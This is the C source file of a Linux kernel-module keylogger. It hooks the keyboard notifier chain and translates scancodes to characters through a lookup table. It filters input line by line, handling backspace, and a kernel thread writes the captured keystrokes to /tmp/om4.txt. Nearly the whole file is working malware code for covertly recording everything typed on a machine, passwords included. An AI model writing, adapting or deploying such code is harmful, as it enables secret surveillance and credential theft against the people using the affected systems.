#include "include/keylog.h" 

extern struct file *lkm_file_open(const char *name);//from file.c
extern ssize_t lkm_file_write(struct file *f, const void *buf, size_t len, loff_t *off);//from file.c
extern int lkm_file_close(struct file *f);//from file.c

int lkm_keylog_init(void);
int lkm_keylog_exit(void);
static int lkm_keylog_sync(keylog_buf *main, keylog_buf *tmp);
static int lkm_keylog_filter(char code, const char *sym, keylog_buf *filt);
static int lkm_keylog_hook(struct notifier_block *nblk, unsigned long code, void *nparam); 
int _lkm_keylog_buf2file(void *b); 

static struct notifier_block lkm_keylog_nblk = {
	.notifier_call = lkm_keylog_hook,
};

static const char *lkm_keylogmap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       		// 0-3
    	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 		// 4-7
    	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 		// 8-11
    	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         		// 12-14
    	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
    	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 		// 20-23
    	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 		// 24-27
    	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   		// 28-31
    	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 		// 32-35
    	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 		// 36-39
    	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, 		// 40-43
    	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 		// 44-47
    	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 		// 48-51
    	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
    	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
    	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         		// 60-63
    	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         		// 64-67
    	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   		// 68-70
    	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, 		// 71-73
    	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         		// 74-76
    	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         		// 77-79
    	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, 		// 80-82
    	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      		// 83-85
    	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     		// 86-89
    	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
    	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
    	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   		// 99-101
    	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   		// 102-104
    	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
    	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   		// 108-110
    	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   		// 111-114
    	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         		// 115-118
    	{"_PAUSE_", "_PAUSE_"},                                         		// 119
};
#define KLG_BUF1_SIZE	512
#define KLG_BUFM_SIZE	2048
static char tmp_buf1[KLG_BUF1_SIZE+16] = {0};
static char filtr_buf1[KLG_BUFM_SIZE+16] = {0};
static int backspace_flag = 0;		//if(backspace_flag)  then the next symbol needs BACKSPACE
static keylog_buf filtr_1buf = { .buf = tmp_buf1, .cnt = 0, .size = 40, .data = (char*)&backspace_flag};
static keylog_buf filtr_mbuf = { .buf = filtr_buf1, .cnt = 0, .size = 56};
static const char *lkm_keylog_tmpfile = "/tmp/om4.txt";
struct task_struct *lkm_keylog_task = NULL;
/*
///////////////////////////////  DEBUG  /////////////////////////////////////////////////////////////
static void lkm_keylog_dump2(keylog_buf *filt) {
	char *buf = filt->buf;
	int cnt = filt->cnt;
	if(cnt>=filt->size) return;

	printk(KERN_INFO "dump(%d):", cnt);
		printk(KERN_INFO "%s", buf);

	return;
}
///////////////////////////////////////////////////////////////////////////////////////////////
*/
int _lkm_keylog_buf2file(void *b) {

	struct file *f = NULL;
	keylog_buf *buf = (keylog_buf*)b;

	while(!kthread_should_stop()) {

		f = lkm_file_open(lkm_keylog_tmpfile);			//extern from file.c
		lkm_file_write(f, buf->buf, buf->cnt, &f->f_pos);	//extern from file.c
		lkm_file_close(f);					//extern from file.c
		memset(buf->buf, 0, buf->size);
		buf->cnt = 0;
		set_current_state(TASK_INTERRUPTIBLE);
		schedule();
	}
	f = lkm_file_open(lkm_keylog_tmpfile);			//extern from file.c
	lkm_file_write(f, buf->buf, buf->cnt, &f->f_pos);	//extern from file.c
	lkm_file_close(f);	
	return 0;
}
static int lkm_keylog_sync(keylog_buf *main, keylog_buf *tmp) {

	char *mb = main->buf;
	char *tb = tmp->buf;
	int mc = main->cnt;
	int tc = tmp->cnt;
	int i;
	if(!mb || !tb || !tc) return -1;
	if(tc>=main->size) return -1;

	for(i=0; (i<tc) && ((mc+i)<main->size) && (i<tmp->size); i++) {
		mb[mc+i] = tb[i];
	}

	main->cnt = mc+i;
	if( tmp->size>=(main->size-mc) && lkm_keylog_task ) {
		wake_up_process(lkm_keylog_task);
	}
	if(i!=tc) return i;
	return 0;
} 
static int lkm_keylog_filter(char code, const char *sym, keylog_buf *filt) {

	//char code = key;
	char *buf = filt->buf;
	int  *backsp = (int*)filt->data;
	int  size = filt->size;
	int  cnt = filt->cnt;

	if((*backsp) || (cnt>=size)) {    //need BACKSPACE or cnt >= bufer size

		if(code==14) { 	//"BACKSPACE"

			*backsp = 0;	
			if(cnt>0) {
				cnt--;
				if(cnt<size) buf[cnt] = 0; //del last code 
				goto exit_fm;
			}
		}
		else {//clean all tmp_buf1 and continue...
			memset(buf, 0, size);
			*backsp = 0;
			cnt = 0;
		}
	}
	if((code>=2) && (code<=58) ) {
		switch(code) {
			case 28: //"/n"
				if(cnt<1) break;
				//buf[cnt] = code; //add code to tmp_buf1 
				buf[cnt] = *sym; //add symbol to tmp_buf1 
				filt->cnt = ++cnt;
				lkm_keylog_sync(&filtr_mbuf, filt);
  				//lkm_keylog_dump2(&filtr_mbuf);

				memset(buf, 0, size);
				cnt = 0;
				*backsp = 0;
				filt->cnt = cnt;
				return 1;
			case 14: //"BACKSPACE"
				if(cnt<=0) break;
				cnt--;
				buf[cnt] = 0; //del last symbol 
				break;
			case 15: //"TAB"
			case 29: //"LCTRL"
			case 42: //"LSHIFT"
			case 54: //"RSHIFT"
			case 55: //"PRTSCR"
			case 56: //"LALT"
			case 58: //"CAPS"
				//add code to tmp_buf1 and wait BACKSPACE in next code
				//*backsp = 1; buf[cnt] = *sym; cnt++;
				break;
			default:
				buf[cnt] = *sym;
				cnt++;
				break;
		}	
	}
	else {
		//add code to tmp_buf1 and wait BACKSPACE in next code
		//*backsp = 1; buf[cnt] = *sym; cnt++;
	}

   exit_fm:
	filt->cnt = cnt;
	return 0;
}
static int lkm_keylog_hook(struct notifier_block *nblk, unsigned long code, void *nparam) {

	const char *sym = NULL;
	struct keyboard_notifier_param *param = nparam;
	int shift = param->shift;
	int key = param->value;

	if(!(param->down)) return NOTIFY_OK;
	if( (key>KEY_RESERVED) && (key<=KEY_PAUSE)) {

		sym = (shift==1) ? lkm_keylogmap[key][1] : lkm_keylogmap[key][0];
		lkm_keylog_filter(key, sym, &filtr_1buf);
	}
     	if(!sym) return NOTIFY_OK;

	return NOTIFY_OK;
}
/////////////////////////////////////////////////////////////////////////////////
int lkm_keylog_init(void) {
	printk(KERN_INFO "+++INIT_keyloger\n");

	lkm_keylog_task = kthread_create(_lkm_keylog_buf2file, &filtr_mbuf, "lkm_keyloger_buf2file");
	register_keyboard_notifier(&lkm_keylog_nblk);

	return 0;
}
int lkm_keylog_exit(void) {

	unregister_keyboard_notifier(&lkm_keylog_nblk);
	if(lkm_keylog_task && !IS_ERR(lkm_keylog_task)) {
		kthread_stop(lkm_keylog_task);
		wake_up_process(lkm_keylog_task);
	}
	printk(KERN_INFO "---EXIT_keyloger\n");
	return 0;
}
